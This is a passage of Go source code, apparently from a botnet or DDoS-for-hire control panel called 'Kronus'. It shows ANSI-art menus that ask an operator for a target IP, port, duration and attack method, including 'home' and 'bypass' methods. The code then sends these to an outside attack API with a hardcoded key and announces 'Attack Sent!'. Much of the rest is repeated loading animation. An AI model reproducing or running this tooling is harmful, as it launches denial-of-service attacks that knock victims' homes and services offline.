			this.conn.Write([]byte("\033[1;49;35m          ║-----------K R O N U S  A P I  M E T H O D S ------------║════════════╝     ║\033[0m \r\n"))                                                               
			this.conn.Write([]byte("\033[1;49;35m          ║-----810 For Homes Methods | 200 For Bypass Methods------║                  ║\033[0m \r\n"))                                         
			this.conn.Write([]byte("\033[1;49;35m          ╚═════════════════════════════════════════════════════════╝══════════════════╝\033[0m \r\n"))                                                                     
			this.conn.Write([]byte("\033[1;49;32m\033[0m \r\n"))
			this.conn.Write([]byte("\033[0m\r\n")) 
			continue
        }
			   if err != nil || cmd == ".SEND" || cmd == ".send" {
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[1;49;35m\033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m              ╦╔═- ╦═╗- ╔═╗- ╦═╗- ╦ ╦- ╔═╗\033[0m \r\n"))  
			this.conn.Write([]byte("\033[1;49;35m              ╠╩╗- ╟╦╝- ║ ║- ║ ║- ║ ║- ╚═╗\033[0m \r\n"))  
			this.conn.Write([]byte("\033[1;49;35m              ╩ ╩- ╩╚═- ╚═╝- ╩ ╩- ╚═╝- ╚═╝\033[0m \r\n"))  
			this.conn.Write([]byte("\033[1;49;35m          ╔════════════════════════════════════════╗\033[0m \r\n"))  
			this.conn.Write([]byte("\033[1;49;35m          ║- - - - - - - - - - - - -  - - - - - - -║\033[0m \r\n"))  
			this.conn.Write([]byte("\033[1;49;35m          ║- -  𝓟𝓛𝓔𝓐𝓢𝓔 𝓔𝓝𝓣𝓔𝓡 𝓐 𝓘𝓟 𝓐𝓓𝓓𝓡𝓔𝓢𝓢 -  -  -  ║\033[0m \r\n"))  
			this.conn.Write([]byte("\033[1;49;35m          ║- - - - - -- - - - - - - - - - - - - - -║\033[0m \r\n"))  
			this.conn.Write([]byte("\033[1;49;35m          ╚════════════════════════════════════════╝\033[0m \r\n"))  
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("                          \033[1;49;35m║\033[00;1;95mIP\033[0m: "))
			locipaddress, err := this.ReadLine(false)
			this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[1;49;35m\033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m              ╦╔═- ╦═╗- ╔═╗- ╦═╗- ╦ ╦- ╔═╗\033[0m \r\n"))  
			this.conn.Write([]byte("\033[1;49;35m              ╠╩╗- ╟╦╝- ║ ║- ║ ║- ║ ║- ╚═╗\033[0m \r\n"))  
			this.conn.Write([]byte("\033[1;49;35m              ╩ ╩- ╩╚═- ╚═╝- ╩ ╩- ╚═╝- ╚═╝\033[0m \r\n"))  
			this.conn.Write([]byte("\033[1;49;35m          ╔════════════════════════════════════════╗\033[0m \r\n"))  
			this.conn.Write([]byte("\033[1;49;35m          ║- - - - - - - - - - - - -  - - - - - - -║\033[0m \r\n"))  
			this.conn.Write([]byte("\033[1;49;35m          ║- - - 𝓟𝓛𝓔𝓐𝓢𝓔 𝓔𝓝𝓣𝓔𝓡 𝓐 𝓟𝓞𝓡𝓣 - - - -  - -  ║\033[0m \r\n"))  
			this.conn.Write([]byte("\033[1;49;35m          ║- - - - - -- - - - - - - - - - - - - - -║\033[0m \r\n"))  
			this.conn.Write([]byte("\033[1;49;35m          ╚════════════════════════════════════════╝\033[0m \r\n"))  
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("                          \033[1;49;35m║\033[00;1;95mPORT\033[0m: "))
            port, err := this.ReadLine(false)
			this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[1;49;35m\033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m              ╦╔═- ╦═╗- ╔═╗- ╦═╗- ╦ ╦- ╔═╗\033[0m \r\n"))  
			this.conn.Write([]byte("\033[1;49;35m              ╠╩╗- ╟╦╝- ║ ║- ║ ║- ║ ║- ╚═╗\033[0m \r\n"))  
			this.conn.Write([]byte("\033[1;49;35m              ╩ ╩- ╩╚═- ╚═╝- ╩ ╩- ╚═╝- ╚═╝\033[0m \r\n"))  
			this.conn.Write([]byte("\033[1;49;35m          ╔════════════════════════════════════════╗\033[0m \r\n"))  
			this.conn.Write([]byte("\033[1;49;35m          ║- - - - - - - - - - - - -  - - - - - - -║\033[0m \r\n"))  
			this.conn.Write([]byte("\033[1;49;35m          ║- - - 𝓟𝓛𝓔𝓐𝓢𝓔 𝓔𝓝𝓣𝓔𝓡 𝓐 𝓣𝓘𝓜𝓔 - - - -  - -  ║\033[0m \r\n"))  
			this.conn.Write([]byte("\033[1;49;35m          ║- - - - - -- - - - - - - - - - - - - - -║\033[0m \r\n"))  
			this.conn.Write([]byte("\033[1;49;35m          ╚════════════════════════════════════════╝\033[0m \r\n"))  
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("                          \033[1;49;35m║\033[00;1;95mTIME\033[0m: "))
            timee, err := this.ReadLine(false)
			this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[1;49;35m\033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m              ╦╔═- ╦═╗- ╔═╗- ╦═╗- ╦ ╦- ╔═╗\033[0m \r\n"))  
			this.conn.Write([]byte("\033[1;49;35m              ╠╩╗- ╟╦╝- ║ ║- ║ ║- ║ ║- ╚═╗\033[0m \r\n"))  
			this.conn.Write([]byte("\033[1;49;35m              ╩ ╩- ╩╚═- ╚═╝- ╩ ╩- ╚═╝- ╚═╝\033[0m \r\n"))  
			this.conn.Write([]byte("\033[1;49;35m          ╔════════════════════════════════════════╗\033[0m \r\n"))  
			this.conn.Write([]byte("\033[1;49;35m          ║- - - - - - - - - - - - -  - - - - - - -║\033[0m \r\n"))  
			this.conn.Write([]byte("\033[1;49;35m          ║- - - 𝓟𝓛𝓔𝓐𝓢𝓔 𝓔𝓝𝓣𝓔𝓡 𝓐 𝓜𝓔𝓣𝓗𝓞𝓓 - - -  -    ║\033[0m \r\n"))  
			this.conn.Write([]byte("\033[1;49;35m          ║- - - - - -- - - - - - - - - - - - - - -║\033[0m \r\n"))  
			this.conn.Write([]byte("\033[1;49;35m          ╚════════════════════════════════════════╝\033[0m \r\n"))  
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("                          \033[1;49;35m║\033[00;1;95mMETHOD\033[0m: "))
            method, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.lea.kz/fbiVIP.php?key=ProjectKronus&host=" + locipaddress + "&port=" + port + "&time=" + timee + "&method=" + method + ""
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;49;35m                                ║Attack Sent!\033[37;1m\r\n")))
                this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING---->                                                                                      \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING----->                                                                                    \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING------->                                                                                  \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING--------->                                                                               \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING----------->                                                                             \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING-------------->                                                                           \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING----------------->                                                                        \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING------------------->                                                                    \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING----------------------->                                                                 \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING-------------------------->                                                              \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING----------------------------->                                                           \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING-------------------------------->                                                         \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING---------------------------------->                                                       \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING------------------------------------>                                                     \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING-------------------------------------->                                                   \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING----------------------------------------->                                                \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING------------------------------------------->                                              \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING--------------------------------------------->                                            \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING----------------------------------------------->                                          \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING------------------------------------------------->                                        \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING--------------------------------------------------->                                      \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING----------------------------------------------------->                                    \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING-------------------------------------------------------->                                 \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING---------------------------------------------------------->                               \r\n"))
            this.conn.Write([]byte("\033[32m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(600 * time.Millisecond)
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING----->                                                                                      \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING------->                                                                                    \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING--------->                                                                                  \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING------------>                                                                               \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING-------------->                                                                             \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING---------------->                                                                           \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING------------------->                                                                        \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING----------------------->                                                                    \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING-------------------------->                                                                \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING----------------------------->                                                             \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING-------------------------------->                                                           \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING---------------------------------->                                                         \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING------------------------------------>                                                       \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING-------------------------------------->                                                     \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING---------------------------------------->                                                   \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING------------------------------------------->                                                \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING--------------------------------------------->                                              \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING----------------------------------------------->                                            \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING------------------------------------------------->                                          \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING--------------------------------------------------->                                        \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING----------------------------------------------------->                                      \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING------------------------------------------------------->                                    \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING---------------------------------------------------------->                                 \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING------------------------------------------------------------>                               \r\n"))
            this.conn.Write([]byte("\033[34m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(600 * time.Millisecond)
                
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING----->                                                                                      \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING------->                                                                                    \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING--------->                                                                                  \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING------------>                                                                               \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING-------------->                                                                             \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING---------------->                                                                           \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING------------------->                                                                        \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING----------------------->                                                                    \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING-------------------------->                                                                \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING----------------------------->                                                             \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING-------------------------------->                                                           \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING---------------------------------->                                                         \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING------------------------------------>                                                       \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING-------------------------------------->                                                     \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING---------------------------------------->                                                   \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING------------------------------------------->                                                \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING--------------------------------------------->                                              \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING----------------------------------------------->                                            \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING------------------------------------------------->                                          \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING--------------------------------------------------->                                        \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING----------------------------------------------------->                                      \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING------------------------------------------------------->                                    \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING---------------------------------------------------------->                                 \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING------------------------------------------------------------>                               \r\n"))
            this.conn.Write([]byte("\033[34m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(600 * time.Millisecond)
                
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING----->                                                                                      \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING------------->                                                                                    \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING--------------->                                                                                  \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING------------------>                                                                               \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING-------------------->                                                                             \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING---------------------->                                                                           \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING------------------------->                                                                        \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING----------------------------->                                                                    \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING-------------------------------->                                                                 \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING----------------------------------->                                                              \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING-------------------------------------->                                                           \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING---------------------------------------------->                                                   \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING------------------------------------------------->                                                \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING---------------------------------------------------->                                             \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING----------------------------------------------------->                                            \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING------------------------------------------------------->                                          \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING-------------------------------------------------------------->                                   \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING----------------------------------------------------------------->                                \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING------------------------------------------------------------------->                              \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING--------------------------------------------------------------------------->                      \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING----------------------------------------------------------------------------->                    \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING------------------------------------------------------------------------------->                  \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING---------------------------------------------------------------------------------->               \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING------------------------------------------------------------------------------------>             \r\n"))
            this.conn.Write([]byte("\033[34m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(600 * time.Millisecond)
                
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING----->                                                                                      \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING------->                                                                                    \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING--------->                                                                                  \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING------------>                                                                               \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING-------------->                                                                             \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING---------------->                                                                           \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING------------------->                                                                        \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING----------------------->                                                                    \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING-------------------------->                                                                 \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING----------------------------->                                                              \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING-------------------------------->                                                           \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING---------------------------------->                                                         \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING------------------------------------>                                                       \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING-------------------------------------->                                                     \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING---------------------------------------->                                                   \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING------------------------------------------->                                                \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING--------------------------------------------->                                              \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING----------------------------------------------->                                            \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING------------------------------------------------->                                          \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING--------------------------------------------------->                                        \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING----------------------------------------------------->                                      \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING------------------------------------------------------->                                    \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING---------------------------------------------------------->                                 \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING-------------------------------------------------------->                               \r\n"))
            this.conn.Write([]byte("\033[34m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(600 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[34m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[1;49;35m         | == /        \r\n"))
            this.conn.Write([]byte("\033[34m          |  |         \r\n"))
            this.conn.Write([]byte("\033[1;49;35m          |  |         \r\n"))
            this.conn.Write([]byte("\033[34m          |  /         \r\n"))
            this.conn.Write([]byte("\033[1;49;35m           |/          \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
			            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[1;49;35m         | == /        \r\n"))
            this.conn.Write([]byte("\033[34m          |  |         \r\n"))
            this.conn.Write([]byte("\033[1;49;35m          |  |         \r\n"))
            this.conn.Write([]byte("\033[34m          |  /         \r\n"))
            this.conn.Write([]byte("\033[1;49;35m           |/          \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[37m         | == /        \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  /         \r\n"))
            this.conn.Write([]byte("\033[37m           |/          \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[37m         | == /        \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  /         \r\n"))
            this.conn.Write([]byte("\033[37m           |/          \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[37m         | == /        \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  /         \r\n"))
            this.conn.Write([]byte("\033[37m           |/          \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                           
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[32m          / **/|       \r\n"))
            this.conn.Write([]byte("\033[32m          | == /       \r\n"))
            this.conn.Write([]byte("\033[32m           |  |        \r\n"))
            this.conn.Write([]byte("\033[32m           |  |        \r\n"))
            this.conn.Write([]byte("\033[32m           |  /        \r\n"))
            this.conn.Write([]byte("\033[32m            |/         \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                            
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m          / **/|       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m          | == /       \r\n"))
            this.conn.Write([]byte("\033[32m           |  |        \r\n"))
            this.conn.Write([]byte("\033[1;49;35m           |  |        \r\n"))
            this.conn.Write([]byte("\033[32m           |  /        \r\n"))
            this.conn.Write([]byte("\033[1;49;35m            |/         \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[32m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                            
